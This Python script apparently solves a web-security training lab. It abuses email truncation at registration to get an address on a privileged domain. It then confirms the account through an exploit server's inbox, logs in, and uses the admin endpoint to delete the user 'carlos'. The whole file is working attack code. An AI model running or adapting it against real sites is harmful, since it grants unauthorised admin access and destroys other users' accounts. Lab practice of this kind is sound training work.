import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token



def delete_user(s, url, exploit_url):
    # REGISTER NEW USER
    register_url = url + "/register"
    user_pass_id = "test"
    email = user_pass_id + 'a'*232
    params = {
        'csrf' : get_csrf(s, register_url),
        'username' : user_pass_id,
        'email' : email + '@dontwannacry.com.' + exploit_url.split("https://")[1],
        'password' : user_pass_id
    }
    r = s.post(register_url, data=params, verify=False, proxies=proxies)
    if "Please check your emails for your account registration link" in r.text:
        print("[+] User registered! Checking now the email to retrieve the confirmation url...")
        
        # CHECK EMAIL AND RETRIEVE THE ACTIVATION URL
        email_url = exploit_url + "/email?raw=0"
        r = s.get(email_url, verify=False, proxies=proxies)
        activation_url = re.search(r"https.+", r.text).group(0)
        print("[+] Got it!")

        # CONFIRM THE USER
        r = s.get(activation_url, verify=False, proxies=proxies)
        if "Account registration successful!" in r.text:
            print("[+] User confirmed!")
            print("Logging-in...")

            # LOG-IN AND CHECK
            login_url = url + "/login"
            params = {
                'csrf' : get_csrf(s, login_url),
                'username' : user_pass_id,
                'password' : user_pass_id
            }
            r = s.post(login_url, data=params, verify=False, proxies=proxies)
            if "Log out" in r.text and r.status_code == 200:
                print("[+] Logged-in successfully! Deleting the user carlos...")
                
                # DELETE USER CARLOS
                delete_carlos_url = url + "/admin/delete?username=carlos"
                r = s.get(delete_carlos_url, verify=False, proxies=proxies)
                if "User deleted successfully!" in r.text:
                    print("[+] User carlos deleted successfully!")

                else:
                    print("[-] Carlos is too strong! I could not delete it!")
                    sys.exit(-1)

            else:
                print("[-] OOOPS! Did not log-in!")
                sys.exit(-1)


        else:
            print("[-] Oh no! Could not confirm the user!")
            sys.exit(-1)

    else:
        print("[-] Something went wrong! Could not register the user...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.example.com www.exploit-server.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    exploit_url = sys.argv[2].strip()

    delete_user(s, url, exploit_url)



if __name__ == "__main__":
    main()